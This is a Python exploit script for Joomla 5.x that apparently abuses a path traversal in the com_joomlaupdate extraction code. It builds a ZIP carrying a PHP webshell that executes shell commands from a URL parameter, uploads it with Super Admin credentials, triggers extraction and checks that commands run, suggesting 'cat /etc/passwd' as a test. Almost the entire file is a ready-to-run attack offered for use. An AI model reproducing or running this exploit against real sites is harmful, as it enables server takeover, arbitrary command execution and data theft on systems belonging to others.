#!/usr/bin/env python3
"""
Joomla 5.x Path Traversal - Exploit
CVE-TBD - administrator/components/com_joomlaupdate/extract.php linha 1086

VULNERABILIDADE:
  ZIPExtraction::readFileHeader() usa basename() para validar nomes de arquivo,
  mas basename('../../../webshell.php') retorna 'webshell.php', permitindo
  path traversal durante a extração de ZIPs maliciosos.

REQUISITOS:
  - Credenciais de Super Admin do Joomla
  - Acesso a /administrator/

USO:
  python3 exploit_joomla_final.py <url> <admin_user> <admin_password>

EXEMPLO:
  python3 exploit_joomla_final.py http://localhost:8080 admin admin123
"""
import requests
import re
import time
import sys
from urllib.parse import urljoin
import struct
import zlib

requests.packages.urllib3.disable_warnings()

WEBSHELL_PHP = b'<?php @system($_GET["cmd"]); phpinfo(); ?>'

MANIFEST_XML = b'''<?xml version="1.0" encoding="UTF-8"?>
<extension type="file" method="upgrade">
    <name>files_joomla</name>
    <version>5.0.2</version>
</extension>'''

def create_malicious_zip(output_path, traversal_path='webshell.php'):
    """Cria ZIP com path traversal"""
    entries = [
        ('administrator/manifests/files/joomla.xml', MANIFEST_XML),
        (traversal_path, WEBSHELL_PHP),
    ]

    zip_data = b''
    central_dir = b''
    offsets = []

    for filename, content in entries:
        offsets.append(len(zip_data))
        filename_bytes = filename.encode('utf-8')
        crc = zlib.crc32(content) & 0xFFFFFFFF

        local = struct.pack('<4s2s2sHHHIIIHH',
            b'PK\x03\x04', b'\x14\x00', b'\x00\x00', 0, 0, 0,
            crc, len(content), len(content), len(filename_bytes), 0)

        zip_data += local + filename_bytes + content

        central = struct.pack('<4s2s2s2sHHHIIIHHHHHII',
            b'PK\x01\x02', b'\x14\x03', b'\x14\x00', b'\x00\x00',
            0, 0, 0, crc, len(content), len(content), len(filename_bytes),
            0, 0, 0, 0, 0, offsets[-1])

        central_dir += central + filename_bytes

    eocd = struct.pack('<4sHHHHIIH',
        b'PK\x05\x06', 0, 0, len(entries), len(entries),
        len(central_dir), len(zip_data), 0)

    with open(output_path, 'wb') as f:
        f.write(zip_data + central_dir + eocd)

def exploit(base_url, username, password):
    print("="*70)
    print("Joomla 5.x Path Traversal Exploit")
    print("Target: administrator/components/com_joomlaupdate/extract.php:1086")
    print("="*70)
    print(f"\nTarget: {base_url}")
    print(f"User: {username}\n")

    s = requests.Session()
    s.verify = False

    # 1. Create malicious ZIP
    zip_path = '/tmp/joomla_exploit.zip'
    create_malicious_zip(zip_path, 'webshell.php')
    print("[+] Malicious ZIP created")

    # 2. Login
    print("[+] Authenticating...")
    r = s.get(f"{base_url}/administrator/index.php")
    t = re.search(r'name="([a-f0-9]{32})" value="1"', r.text).group(1)
    r = s.post(f"{base_url}/administrator/index.php", data={
        'username': username,
        'passwd': password,
        'option': 'com_login',
        'task': 'login',
        'return': 'aW5kZXgucGhw',
        t: '1'
    }, allow_redirects=True)

    if 'logout' not in r.text.lower():
        print("[-] Authentication failed")
        return False

    print("[+] Authenticated as Super Admin")

    # 3. Upload
    print("[+] Uploading malicious package...")
    r = s.get(f"{base_url}/administrator/index.php?option=com_joomlaupdate&view=upload")
    t = re.search(r'name="([a-f0-9]{32})" value="1"', r.text).group(1)

    with open(zip_path, 'rb') as f:
        r = s.post(f"{base_url}/administrator/index.php",
            data={'task': 'update.upload', 'option': 'com_joomlaupdate', t: '1'},
            files={'install_package': ('joomla.zip', f, 'application/zip')},
            allow_redirects=False)

    print(f"[+] Upload: HTTP {r.status_code}")

    # 4. Captive auth
    print("[+] Captive authentication...")
    loc = r.headers.get('Location')
    r = s.get(urljoin(base_url, loc))
    t = re.search(r'name="([a-f0-9]{32})" value="1"', r.text).group(1)

    r = s.post(f"{base_url}/administrator/index.php", data={
        'username': username,
        'passwd': password,
        'task': 'update.confirm',
        'option': 'com_joomlaupdate',
        t: '1'
    }, allow_redirects=False)

    # 5. Get extraction credentials
    print("[+] Getting extraction password...")
    loc = r.headers.get('Location')
    r = s.get(urljoin(base_url, loc))

    pwd = re.search(r'"password":"([^"]+)"', r.text).group(1)
    ajax_url = re.search(r'"ajax_url":"([^"]+)"', r.text).group(1).replace('\\/', '/')

    # 6. Extract via HTTP
    print("[+] Extracting ZIP...")
    extract_url = urljoin(base_url, ajax_url)

    r = s.post(extract_url, data={'task': 'startExtract', 'password': pwd})

    try:
        result = r.json()
        if not result.get('status'):
            error = result.get('error', result.get('message', 'Unknown'))
            print(f"[-] Extraction failed: {error}")
            return False

        print(f"[+] Extracted {result.get('files', 0)} files")

    except Exception as e:
        print(f"[-] Error: {e}")
        return False

    # 7. Verify webshell
    print("[+] Verifying webshell...")
    time.sleep(2)

    test_url = f"{base_url}/webshell.php"
    try:
        r = requests.get(test_url, params={'cmd': 'id'}, timeout=5, verify=False)

        if r.status_code == 200 and 'uid=' in r.text:
            print(f"\n{'='*70}")
            print(f"[!!!] EXPLOITATION SUCCESSFUL!")
            print(f"{'='*70}")
            print(f"\n[!] Webshell URL: {test_url}")
            print(f"[!] Test command: {test_url}?cmd=whoami")
            print(f"[!] Test command: {test_url}?cmd=cat /etc/passwd")
            print(f"\n{'='*70}")
            return True

    except:
        pass

    print("[-] Webshell not accessible")
    return False


def main():
    if len(sys.argv) < 4:
        print("Usage: python3 exploit_joomla_final.py <url> <admin_user> <admin_pass>")
        print("\nExample:")
        print("  python3 exploit_joomla_final.py http://localhost:8080 admin admin123")
        sys.exit(1)

    base_url = sys.argv[1].rstrip('/')
    username = sys.argv[2]
    password = sys.argv[3]

    success = exploit(base_url, username, password)
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
